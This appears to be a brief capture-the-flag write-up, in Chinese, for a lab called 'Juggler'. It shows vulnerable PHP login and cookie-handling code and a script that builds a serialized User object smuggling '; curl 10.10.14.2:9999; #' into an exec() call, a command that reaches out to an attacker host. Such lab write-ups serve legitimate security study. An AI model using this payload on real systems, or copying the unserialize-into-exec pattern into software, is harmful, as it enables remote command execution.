# Juggler

## Web Service PHP 反序列化

```php title="index.php"
<?php
require_once('User.php');

if (isset($_POST['username']) && isset($_POST['password'])) {
    $user = $_POST['username'];
    $pass = $_POST['password'];

    if (strcmp($user, $username) == 0 && strcmp($pass, $password) == 0 ) {
        $logged = true;
    } else {
        $logged = false;
        $msg = "Invalid Credentials";
    }
}
?>
```

```php title="User.php"
<?php
$username = "admin";
$password = "EKkrcTUw+pq0sJHWU4zG7g==";

class User {
    public $username;
    public $id;

    public function __construct($username) {
        $this->username = $username;
        $this->id = "1000";
    }

    public function __wakeup() {
        $this->id = exec("id -u" . $this->username);
    }

}
```

```php title="home.php"
<?php
if (isset($_COOKIE['data'])) {
    $user = unserialize($_COOKIE['data']);
} else {
    $user = new User(system('whoami'));
    setcookie('data',  serialize($user), time() + 3600);
}
echo "<p>System Administrator (SYSADM) -" . $user->username . "(" . $user->id . ")</p>";
?>
```

从 `/home.php` 的 Cookie data 入手，打反序列化就行

:::warning

记得反序列化载荷里面有分号，需要编码一下

:::

```php
<?php
class User {
    public $username;
    public $id;
    public function __construct($username) {
        $this->username = $username;
        $this->id = "1000";
    }
    public function __wakeup() {
        $this->id = exec("id -u " . $this->username);
    }
}

// 构造恶意对象
$maliciousUser = new User("; curl 10.10.14.2:9999; #");
$serializedData = serialize($maliciousUser);

echo $serializedData;
?>
```

[codwer-labs/attack_defense/php_unserialization.md](https://github.com/JCernei/codwer-labs/blob/2db74d914e377afaa342c444aa6dc396badfaa26/attack_defense/php_unserialization.md)
